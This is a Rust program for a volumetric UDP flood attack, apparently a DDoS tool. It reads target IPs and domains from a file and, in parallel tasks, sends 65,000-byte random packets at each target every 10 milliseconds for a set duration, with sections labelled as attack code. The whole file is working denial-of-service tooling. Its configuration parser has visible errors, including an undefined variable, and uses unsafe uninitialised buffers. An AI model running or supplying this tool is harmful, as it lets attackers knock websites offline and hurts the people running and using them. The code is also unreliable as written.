#[macro_use]
extern crate log;

extern crate pretty_env_logger;

use std::{
    fmt::{Debug, Display, Formatter},
    fs::File,
    io::{BufRead, BufReader},
    net::{IpAddr, SocketAddr, UdpSocket},
    thread::sleep,
    time::{Duration, Instant},
};

use anyhow::*;
use dns_lookup::lookup_host;
use portpicker::pick_unused_port;
use rand::{thread_rng, RngCore};

// ----- Attack Config START -----
#[derive(Clone)]
struct Config {
    execution_time: u64,
    timeout: Duration,
    packet_size: usize,
    default_ports: Vec<String>,
}

impl Display for Config {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        write!(
            f,
            "Config {{ execution_time: {}s, timeout: {}ms, packet_size: {} bytes, default_ports: [{}] }}",
            self.execution_time,
            self.timeout.as_millis(),
            self.packet_size,
            self.default_ports.join(", ")
        )
    }
}

async fn load_config() -> Result<Config> {
    let config_file = File::open("config")?;
    let config_lines = BufReader::new(config_file).lines();

    // Default execution time - a minute
    let mut execution_time = 60;

    // Default timeout - 10ms
    let mut timeout = 10;

    // Default packet size - 65000 bytes
    let mut packet_size = 65000;

    let mut default_ports = vec![];

    for config_line in config_lines.flatten() {
        if config_line.is_empty() {
            continue;
        }

        let mut split = config_line.split(' ');

        if let Some(first) = split.next() {
            match first {
                "execution_time" => {
                    if let Some(ex_time) = split.next() {
                        execution_time = ex_time.parse()?;
                    }
                }
                "timeout" => {
                    if let Some(t_out) = split.next() {
                        timeout = t_out.parse()?;
                    }
                }
                "packet_size" => {
                    if let Some(p_size) = split.next() {
                        packet_size = p_size.parse()?;
                    }
                }
                "default_ports" => {
                    while let Some(port) = split.next() {
                        default_ports.push(port);
                    }
                    if let Some(p) = split.next() {
                        default_port = p.to_string();
                    }
                }
                _ => {}
            }
        }
    }

    // Default port if not set - 80
    if default_ports.len() == 0 {
        default_ports.push("80");
    }

    let config = Config {
        execution_time,
        timeout: Duration::from_millis(timeout),
        packet_size,
        default_ports: default_ports.iter().map(|port| port.to_string()).collect(),
    };

    info!("Loaded config: {}", config);

    Ok(config)
}
// ----- Attack Config END -----

// ----- Website Configuration START -----
#[derive(Clone)]
enum WebsiteConfig {
    Ip { ip: String, ports: Vec<String> },
    Domain { link: String, ports: Vec<String> },
}

impl Debug for WebsiteConfig {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            WebsiteConfig::Ip { ip, ports } => write!(
                f,
                "{}",
                format!(
                    "[{}]",
                    ports
                        .iter()
                        .map(|port| format!("{}:{}", ip, port))
                        .collect::<Vec<_>>()
                        .join(", ")
                        .to_string()
                )
            ),
            WebsiteConfig::Domain { link, ports } => write!(
                f,
                "{}",
                format!(
                    "[{}]",
                    ports
                        .iter()
                        .map(|port| format!("{} : {}", link, port))
                        .collect::<Vec<_>>()
                        .join(", ")
                        .to_string()
                )
            ),
        }
    }
}

fn load_websites_configs(config: &Config) -> Result<Vec<WebsiteConfig>> {
    info!("Loading websites configs...");

    let mut configs = vec![];
    let websites_file = File::open("websites")?;
    let websites = BufReader::new(websites_file).lines();

    for website in websites.flatten() {
        if website.is_empty() {
            continue;
        }

        let mut split = website.split(' ');

        if let Some(first) = split.next() {
            match first {
                "ip" => {
                    if let Some(ip) = split.next() {
                        let mut ports = vec![];

                        while let Some(port) = split.next() {
                            ports.push(port.to_string());
                        }

                        if ports.len() == 0 {
                            ports = config.default_ports.clone();
                        }

                        for port in ports.iter() {
                            info!("Found ip {} with port {}", ip, port);
                        }

                        configs.push(WebsiteConfig::Ip {
                            ip: ip.to_string(),
                            ports,
                        })
                    }
                }
                "domain" => {
                    if let Some(domain) = split.next() {
                        let mut ports = vec![];

                        while let Some(port) = split.next() {
                            ports.push(port.to_string());
                        }

                        if ports.len() == 0 {
                            ports = config.default_ports.clone();
                        }

                        for port in ports.iter() {
                            info!("Found domain {} with port {}", domain, port);
                        }

                        configs.push(WebsiteConfig::Domain {
                            link: domain.to_string(),
                            ports,
                        });
                    }
                }
                _ => {}
            }
        }
    }

    info!("All websites loaded!\n{:?}", configs);

    Ok(configs)
}
// ----- Website Configuration END -----

// ----- Attack Websites START -----
async fn attack_websites(config: Config, website_configs: Vec<WebsiteConfig>) -> Result<()> {
    info!("Starting attack on the websites...");

    let start = Instant::now();

    let tasks = website_configs
        .iter()
        .map(|website_config| {
            let website_config = website_config.clone();
            let config = config.clone();

            tokio::spawn(async move {
                attack_website(start, config, website_config).await;
            })
        })
        .collect::<Vec<_>>();

    futures::future::join_all(tasks).await;

    Ok(())
}

async fn attack_website(start: Instant, config: Config, website_config: WebsiteConfig) {
    info!("Starting parallel attack process...");

    let packet_size = config.packet_size;

    match website_config {
        WebsiteConfig::Ip { ip, ports } => {
            let tasks = ports
                .iter()
                .map(|port| {
                    let ip = ip.clone();
                    let port = port.clone();

                    tokio::spawn(async move {
                        let sender: SocketAddr = format!(
                            "0.0.0.0:{}",
                            pick_unused_port().expect("No free port found!")
                        )
                        .parse()
                        .expect("Couldn't get sender IP address");

                        let socket = UdpSocket::bind(sender)
                            .expect(&format!("Couldn't bind socket to {}", sender));
                        let ip_address: IpAddr = ip
                            .parse()
                            .expect(&format!("Couldn't parse ip address {}", ip));
                        let port: u16 = port
                            .parse()
                            .expect(&format!("Couldn't parse port {}", port));

                        info!("Creating socket...");
                        let socket_address = &format!("{}:{}", ip_address, port);

                        match socket.connect(socket_address) {
                            std::result::Result::Ok(_) => {
                                let buffer = generate_buffer(packet_size);

                                while start.elapsed().as_secs() < config.execution_time {
                                    let res = socket.send(buffer.as_slice());
                                    match res {
                                        std::result::Result::Ok(size) => {
                                            info!(
                                                "Successfully sent a packet of size {} to {}",
                                                size, socket_address
                                            );
                                        }
                                        std::result::Result::Err(error) => {
                                            error!(
                                                "Failed to send a packet to {}.\nError message: {}",
                                                socket_address, error
                                            );
                                        }
                                    }

                                    sleep(config.timeout);
                                }
                            }
                            Err(error) => {
                                error!(
                                    "Couldn't connect to {}.\nError message: {}",
                                    socket_address, error
                                );
                            }
                        }
                    })
                })
                .collect::<Vec<_>>();

            futures::future::join_all(tasks).await;
        }
        WebsiteConfig::Domain { link, ports } => {
            if let std::result::Result::Ok(ips) = lookup_host(&link) {
                let mut socket_addresses = vec![];

                for ip in ips.iter() {
                    for port in ports.iter() {
                        socket_addresses.push(format!("{}:{}", ip, port));
                    }
                }

                let tasks = socket_addresses
                    .iter()
                    .map(|socket_address| {
                        let socket_address = socket_address.clone();

                        tokio::spawn(async move {
                            info!("Creating socket...");

                            let sender: SocketAddr = format!(
                                "0.0.0.0:{}",
                                pick_unused_port().expect("No free port found!")
                            )
                            .parse()
                            .expect("Couldn't get sender IP address");

                            let socket = UdpSocket::bind(sender)
                                .expect(&format!("Couldn't bind socket to {}", sender));

                            match socket.connect(socket_address.clone()) {
                                std::result::Result::Ok(_) => {
                                    let buffer = generate_buffer(packet_size);

                                    while start.elapsed().as_secs() < config.execution_time {
                                        let res = socket.send(buffer.as_slice());

                                        match res {
                                            std::result::Result::Ok(size) => {
                                                info!(
                                                    "Successfully sent a packet of size {} to {}",
                                                    size, socket_address
                                                );
                                            }
                                            std::result::Result::Err(error) => {
                                                error!(
                                            "Failed to send a packet to {} .\nError message: {}",
                                            socket_address, error
                                        );
                                            }
                                        }

                                        sleep(config.timeout);
                                    }
                                }
                                Err(error) => {
                                    error!(
                                        "Couldn't connect to {}.\nError message: {}",
                                        socket_address, error
                                    );
                                }
                            }
                        })
                    })
                    .collect::<Vec<_>>();

                futures::future::join_all(tasks).await;
            } else {
                error!("Couldn't find ips for the domain!");
            }
        }
    }
}

fn generate_buffer(size: usize) -> Vec<u8> {
    let mut buffer = Vec::with_capacity(size);
    unsafe {
        buffer.set_len(size);
    }

    thread_rng().fill_bytes(buffer.as_mut_slice());

    buffer
}
// ----- Attack Websites END -----

#[tokio::main(flavor = "multi_thread")]
async fn main() -> Result<()> {
    std::env::set_var("RUST_LOG", "info");

    pretty_env_logger::init();

    let config = load_config().await?;
    let website_configs = load_websites_configs(&config)?;

    attack_websites(config, website_configs).await?;

    Ok(())
}
